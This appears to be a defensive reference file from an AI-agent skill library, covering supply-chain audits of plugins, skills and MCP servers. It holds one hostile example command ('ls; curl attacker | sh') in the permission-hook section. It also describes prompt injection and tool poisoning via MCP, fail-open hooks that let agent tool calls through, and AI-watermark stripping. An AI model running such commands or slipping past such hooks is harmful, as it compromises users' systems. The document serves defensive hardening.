# Fabius Praesidium — supply chain and the third-party AI-artifact surface

The on-demand depth for `fabius-praesidium`'s supply-chain leg — the OWASP "vulnerable dependencies" pass made first-class for the AI-tooling era. This is the surface fabius itself lives on. **Defensive only — audit before adopt, pin, sandbox, least-privilege. Scout wide, strike narrow.**

This composes with the STRIDE/OWASP playbook (`references/security-playbook.md` §5–6) — that file pins and audits *package* dependencies; this one extends the same exec/data/net/creds audit to the new artifacts that **run code and hold your tokens**: skills, plugins, agents, MCP servers, and the CI that builds them.

---

## 1. The core reframe — installing an AI artifact is running a stranger's code with your creds

A package you `import` is data until you call it. A **skill, plugin, agent, or MCP server is different in kind**: adopting one grants it execution and, usually, your credentials. Installing it *is* running someone else's code inside your trust boundary — with your tokens, your filesystem, your network.

So the decision rule is not "is this package popular?" It is the same exec/data/net/creds audit praesidium runs on any code, applied **before adoption, every time:**

- **exec** — what does it run? Shell-outs, `eval`, post-install hooks, spawned subprocesses, bundled binaries.
- **data** — what does it read and write? Files, env, history, the clipboard, other tools' state.
- **net** — what does it send, and where? Any outbound call to a host you didn't expect is the finding.
- **creds** — what tokens does it touch? Which scopes does it actually need vs. which it requests.

Documented in the wild (ARGAZ-catalogued, point-in-time early 2026): hundreds of mapped malicious skills and dozens of relevant CVEs across the AI-tooling ecosystem. The threat is not hypothetical; it is the fastest-growing under-defended surface.

## 2. The blind window — "auto-update from upstream" is a standing supply-chain risk

Some plugin registries auto-morph a third-party plugin to a new upstream SHA with **no human review** between versions. You audited SHA `A`; the registry silently advances you to SHA `B` that you never saw. That gap — code change you trust by inertia, not by inspection — is a **blind window**, and it is RCE-by-subscription.

The rule:

- **Pin the exact SHA / version**, never a moving tag (`@latest`, `main`, a floating major).
- **Treat auto-update on an untrusted artifact as a standing risk**, not a convenience. Disable it, or gate each bump on a re-audit of the diff.
- **Re-verify on every bump.** A new SHA is new code; run §1 again before it runs in your boundary.

(Pin-and-lockfile is the same contract as the playbook's package supply chain — extended here to artifacts that update *outside* the lockfile.)

**A worked pinning mechanism** (grok-build's install path, 2026-07 snapshot): an install spec of the form `user/repo@<commit-sha>` is fetched, then **verified after fetch** — the checkout's actual HEAD is compared to the requested SHA, and a mismatch aborts the install. Contrast the alternative the same installer also allows: `user/repo@main` or `@v2` records a *branch/tag-tracking* install, and every subsequent update re-opens the blind window by design. The audit distinction is not "did you pin at install" but "does the artifact **stay** the code you audited."

**The tighten-only ratchet** — a policy-design pattern worth stealing beyond this domain. grok-build's `require_sha` policy (2026-07 snapshot) can be enabled by *either* a config key *or* an environment variable — and **neither source can disable it**: once any source sets it, the effective policy is on. That makes it a security policy a config merge cannot loosen — a project-level file, a template overwrite, or a partial settings sync can only add the restriction, never subtract it. With the ratchet on, the installer refuses unpinned remote installs, sha-less marketplace installs, and updates of branch-tracking installs — the three paths through which an audited artifact silently becomes an unaudited one. When you design any enforcement toggle, ask whether it ratchets: a flag that the next merge can flip off is a preference, not a policy.

**The coverage gap** — and the reason a policy audit reads what the policy does *not* cover: plugins **vendored inside a marketplace source** are copied straight from the synced marketplace checkout, and the pin policy never sees them — the marketplace repo is the unit that got pinned, not the plugins within it (grok-build, 2026-07 snapshot). The vendored plugin rides the marketplace's update cadence with no per-plugin SHA check. So marketplace content must publish its **own** sha entries per plugin, or the ratchet's guarantee stops at the marketplace boundary. Add to the §1 read the audit question: **"what does the pin policy NOT cover?"** — every enforcement layer has a scope, and the exploitable installs live just outside it.

## 3. The adoption gate — audit → pin → sandbox → least-privilege

A four-step gate any skill/plugin/MCP/dependency clears **before** it touches real work:

1. **Audit** — run §1's exec/data/net/creds read. Read what it execs, trace what it sends, list the creds it touches. If you can't tell, that *is* the finding — opacity is disqualifying for something that runs with your tokens.
2. **Pin** — lock the exact SHA (§2). No moving targets.
3. **Sandbox** — run it where it can't reach what it doesn't need: a container, a scratch repo, network egress restricted, filesystem scoped. First run is the riskiest; let it run somewhere it can't hurt you.
4. **Least-privilege the creds** — default-deny, then grant only the scopes the audit proved it uses. A read-only artifact gets a read-only token. (Same least-privilege contract as the playbook §3 and `fabius-cohors` for agents.)

Fail any step → don't adopt, or quarantine until it passes. Severity and the fix→proof triple are the playbook's (`security-playbook.md` §5–6); a malicious artifact in your boundary is **critical** by default.

**The enable ≠ trust split** — a gate design seen in the wild (grok-build, 2026-07 snapshot) that sharpens step 3: *enabling* an artifact loads only its **inert prompt components** — skills, commands, agent definitions — text the model reads. Its **code-running components** — hooks, MCP servers, LSP servers — require a separate, explicit trust grant before they execute. And the trust default is path-sensitive: artifacts in the *user's own directory* may be auto-trusted, while the same artifact in a *project directory* demands explicit trust — because a cloned repo must not run code just by being opened. That is the right shape: the cheap grant loads text, the expensive grant runs processes, and provenance (who put this file here?) decides which default applies. Add the audit question: **"which components are prompts vs processes, and does the host gate them differently?"** — a host that loads a repo's hooks on enable has no gate at all.

The split gates **code execution only**. An enabled-but-untrusted artifact still puts its prompt components in front of the model — skills and commands remain a §1 exec/data/net/creds surface and a prompt-injection vector (`references/ai-review.md`); trust-gating the hooks does not sanitize the text.

## 4. MCP servers are a privileged trust grant

An MCP server is not a library — it is a process you hand tools and tokens to, that the model then drives. Audit it as the most privileged thing in the chain:

- **Enumerate its tools** — every tool is a capability the model can be talked into invoking. Unbounded `exec`/`write_file`/`fetch` tools are the surface.
- **Scope its credentials** — the server gets the minimum token, not your full session. Default-deny.
- **Pin and sandbox it** like any other artifact (§2–3); its updates carry the same blind window.
- **The diff that reaches the model is untrusted input** — an MCP tool returning attacker-controlled text can carry prompt injection (cross-link: the AI-review prompt-injection caveat, `references/ai-review.md`). Agent-side tool/credential scoping is owned by `fabius-cohors` — route the *agent's* permission model there; this layer owns auditing the *server artifact* you install.
- **The fail-open hook caveat** — hosts let a user-supplied permission hook approve or deny each tool call, and the failure semantics decide whether that is a boundary. In the observed design (grok-build, 2026-07 snapshot), a hook that **crashes, times out, or is simply missing lets the call proceed** — availability wins over enforcement. A fail-open enforcement layer is not a boundary; it is a filter that an error removes. If you build enforcement as a hook, it must handle its own errors (an exception inside the hook must become *deny*, not *absent*), and it must account for **chained commands** — approving `ls` must not approve `ls; curl attacker | sh` because the hook matched only the first token. Audit any permission layer by asking what happens when it *doesn't* run.

**The spec now draws its own pass/fail line — use it.** The trust-grant framing above is right, but as of MCP revision **2026-07-28** several of these stopped being judgement calls and became normative requirements. A violation is a **finding**, not a suggestion. Cite the revision when you write it up; the next one moves.

- **Audience, not bearer.** An MCP server **MUST NOT** accept any token that was not explicitly issued *to it* (audience claim, RFC 9068). Accepting one and forwarding it downstream is *token passthrough* — the confused deputy with the trust boundary already crossed, and it silently voids the downstream service's rate-limiting, request validation and audit trail.
- **Consent before redirect.** A proxying server **MUST** keep a per-user registry of approved `client_id`s and check it *before* forwarding to the third-party authorization server; **MUST** match `redirect_uri` by exact string (no wildcards, no prefixes); and **MUST** mint a cryptographically random, single-use, short-lived `state` stored **only after** the user approved. If consent rides a cookie it **MUST** be `__Host-`prefixed, `Secure`, `HttpOnly`, `SameSite=Lax`, signed or server-side, and **bound to that specific `client_id`** — "the user consented once" is not consent for *this* client.
- **Possession is not identity.** MCP is stateless as of this revision, so state spanning calls rides an explicit handle passed back as an ordinary tool argument. A server **MUST NOT** treat possession of that handle as authentication, and **SHOULD** key stored state as `<user_id>:<handle>` with the user id derived from the *verified token*, never from the client. This is IDOR wearing protocol clothes — the same check the playbook's OWASP pass demands of an object id, applied to a handle. (The pre-2026-07-28 "session ID hijacking" guidance is superseded, not renamed.)
- **Authorization URLs are attacker-supplied.** A client **MUST** allow only `http`/`https` (and `http` only for loopback in development), **MUST** reject `javascript:`, `data:`, `file:`, `vbscript:`, and **MUST NOT** open a server-supplied URL through a shell (`cmd.exe`, `sh`, PowerShell). Those are an XSS path and an RCE path, not hygiene.
- **Show the whole command.** One-click local-server configuration **MUST** display the exact command, untruncated, before it runs. A truncated command is an unread command — and the §3 *enable ≠ trust* split is what decides whether it runs at all.
- **Tool annotations are untrusted too.** Clients **MUST** consider tool annotations untrusted unless the server itself is trusted (that one lives in the spec's *Server → Tools → Data Types* section, **not** the security-best-practices page — cite it correctly or the finding gets bounced). This *extends* the bullet above rather than repeating it: that one covers what a tool **returns**; this covers the `description` and `annotations` a server publishes at `tools/list`, which land in the model's context **before any call is made** — and re-land silently on every `listChanged`. That is the tool-poisoning class: the injection arrives at connect time.

**And one SHOULD that reads like a MUST but isn't.** The *client* is an SSRF surface, because a malicious **server** supplies the OAuth discovery URLs (`resource_metadata`, `authorization_servers`, `token_endpoint`). Only "consider SSRF risks and implement appropriate mitigations" is a MUST; enforcing HTTPS, blocking private/loopback/link-local ranges, and validating each redirect hop are **SHOULD**s. Don't write them up as spec violations — write them on their own merits at whatever severity your threat model gives them. The blocklist and the egress skeleton already exist in [hardening-guides.md](hardening-guides.md) §7; the only new thing here is the **direction** — the untrusted URL arrives from the server you connected to, not from a user form. Mind the DNS-rebinding TOCTOU between check and use, and **don't hand-roll the IP parser** (octal, hex and IPv4-mapped IPv6 defeat custom ones).

**The map, if you want one.** OWASP now runs a dedicated **MCP Top 10** — currently **beta, v0.1**, entries suffixed `:2025`: MCP01 Token Mismanagement & Secret Exposure · MCP02 Privilege Escalation via Scope Creep · MCP03 Tool Poisoning · MCP04 Software Supply Chain Attacks & Dependency Tampering · MCP05 Command Injection & Execution · MCP06 Intent Flow Subversion · MCP07 Insufficient Authentication & Authorization · MCP08 Lack of Audit and Telemetry · MCP09 Shadow MCP Servers · MCP10 Context Injection & Over-Sharing. Use it the way the playbook uses the OWASP web list — **the enumeration that stops an audit from being whatever you happened to remember.** It is beta and it will move; the MUSTs above are the ones with teeth today. Re-verify the spec revision before you quote it — a normative claim against a superseded revision is a false finding, and this file's own §6 rule applies to the standard as much as to the scanner.

## 5. Broaden the audit to where real bugs actually hide

Package-CVE scanning is table stakes. The high-value findings (trailofbits-class breadth) sit in the surrounding machinery — audit these as part of the supply chain, not after it:

- **Supply-chain integrity** — typosquats, dependency confusion (a public package shadowing your private one), unsigned/unverified artifacts, compromised maintainer accounts. Verify provenance for anything you didn't write.
- **CI / GitHub Actions hardening** — a poisoned workflow is **RCE on your repo and a path to your secrets**. Pin actions to a full commit SHA (not `@v4`), set least-privilege `permissions:` on `GITHUB_TOKEN` (default-deny, read-only baseline), never run untrusted code in a `pull_request_target` context, and don't expose secrets to fork PRs.
- **Timing side-channels** — non-constant-time comparison of secrets/tokens/HMACs leaks them a bit at a time. Use constant-time compare for any secret equality check.
- **Language-specific footguns** — C/C++ memory safety (UAF, overflow), unsafe deserialization (pickle, Java `readObject`, YAML unsafe-load), unchecked FFI boundaries. These don't show in a dependency audit; they show in a read of the code.

## 6. Make it repeatable in CI — rule packs, not one-off reads

A one-time audit rots on the next bump (§2). Encode the checks so they re-run on every change:

- **Semgrep-style rule packs** make the §5 classes repeatable — supply-chain integrity, injection, hardcoded secrets, dangerous sinks — as a CI gate that fails the build, not a memory you have to re-perform.
- **Per-ecosystem package audit in CI** — `npm audit` / `pip-audit` / `cargo audit` on every PR, acting on highs/criticals (playbook §6).
- **Action-pinning lint** — assert workflows pin SHAs and scope `permissions:`.

Tool names and versions here are a **point-in-time snapshot (early 2026), not law** — Semgrep, the per-ecosystem auditors, the registries' auto-update behavior all move. Encode the decision (audit → pin → sandbox → least-privilege → re-verify on bump); re-verify the tool and the version number when you run it.

## 7. AI-provenance-mark hygiene — content you own

`watermarks-remover` (guillaumemeyer, **MIT** — verified) fuses two unlike jobs under one name. Split them: one is a standing fabius gate, the other narrow privacy work, and **both stay brand-safe only because neither is detector-evasion.**

**Job A — invisible-character hygiene (defensive, always-on).** Its deterministic, stdlib-only pass strips zero-width chars, bidirectional marks, Unicode tag chars, and exotic whitespace. That is **exactly the Trojan-Source / bidi-override / homoglyph class** — invisible codepoints that make source read one way and compile another. Stripping them from code and prose you ship is a **correctness + anti-Trojan-Source hardening gate**, not hygiene theater. **fabius runs this strip on generated code and text before shipping** — a standing output gate under `fabius-disciplina` (verify-before-ship) and `fabius-parcus` (always-on floor). This is the capability to use regularly; it never asks "will a detector fire."

**Job B — metadata/privacy strip on content you own.** Remove C2PA / EXIF / XMP / document-properties across images and docs (PNG/JPEG/WebP/AVIF/HEIC/PDF/DOCX/EPUB/ODT/HTML/MD) via optional `exiftool` / `qpdf` / `c2patool`. Gotcha: **a PDF's metadata is not truly gone until qpdf does a structural rebuild** — a properties wipe leaves it recoverable in the file body. The honest case is your own EXIF GPS/device trail. Owned content only.

**The boundary — the upstream states it against itself.** Its Layer B (statistical token-watermark removal by paraphrase) **degrades the copy** — flattens tone, voice, precision — and it **"cannot certify vendor detectors will fail after cleaning."** It reports verifiable removals (character counts, metadata actions) separately from best-effort rewrites, and prefers a non-origin model for the rewrite. Hold to **"content you own or are authorized to process."** fabius does **not** frame any of this as defeating content-authenticity or evading AI detection. The `fabius-catena` duality in one line: **catena ADDS verifiable provenance (the seal); this STRIPS vendor marks from content you own — fabius proves its own provenance, it does not erase anyone else's.** (Shape nod: a code-free skill driving a stdlib HTTP service — `/clean` `/inspect` `/health`, base64 payloads, optional bearer — the same keyless "skill drives machinery off the agent host" pattern fabius's own runtime recon uses.)

**⚠️ The supply-chain trap — a second worked instance of `hardening-guides.md` §9.** The MIT core is clean; its *advertised* capability reaches for backends under worse terms — **reverse-SynthID = ⚠️ Non-commercial Research License**, **noai-watermark = ⚠️ no license at all = all-rights-reserved, which GitHub reports as `NOASSERTION`** (MarkLLM / MarkDiffusion are Apache-2.0). This is the exact failure `hardening-guides.md` §9 names: a gate that blocks AGPL and allows the rest **passes non-commercial AND unknown straight through, reporting green.** A tool whose core is MIT but whose advertised pixel-watermark removal *requires* an all-rights-reserved backend is **unshippable via that backend** — the backend is the dependency, not the wrapper. Default-deny on the classification.

## 8. Credit, not bundle

These are capabilities fabius **applies**, drawn from named ecosystem tools — Semgrep's rule packs, the per-ecosystem auditors, trailofbits-class breadth in what to look at. fabius bundles **no runtime**: it carries the decision rules and the audit method, not the scanners. The optional live tier is in `ARCHITECTURE.md`. Present every one of these as "how to do X well, crediting tool Y" — never as a fabius-shipped binary.

---

## When NOT to over-do it

- **The threat-model sets the depth, not paranoia** (`fabius-parcus`: does this control need to exist?). A first-party internal package on a pinned lockfile doesn't need the full §3 sandbox dance; an unknown third-party MCP server that wants your prod token does. Scale the gate to the trust grant.
- **Never drop below the never-trim floor** to save effort — auditing what executes with your creds is floor, not polish (`fabius-parcus`).
- **Don't bury the load-bearing finding** — a single unaudited artifact with full credential access outranks fifty stale-transitive-dependency notes. Report the standing supply-chain risk first.

---

See the owning skill (`../SKILL.md`) §5 for the supply-chain contract, `references/security-playbook.md` §6 for the package-audit commands, `references/ai-review.md` for the prompt-injection caveat on artifact-returned text, and [CORPUS.md](../../../CORPUS.md) for where this library sits in the index. Cross-links: `fabius-scientia` routes third-party science-skill risk here; `fabius-cohors` routes agent tool/credential scoping here. On-chain audit → `fabius-catena`. Defensive only — audit, pin, sandbox, least-privilege, never weaponize.
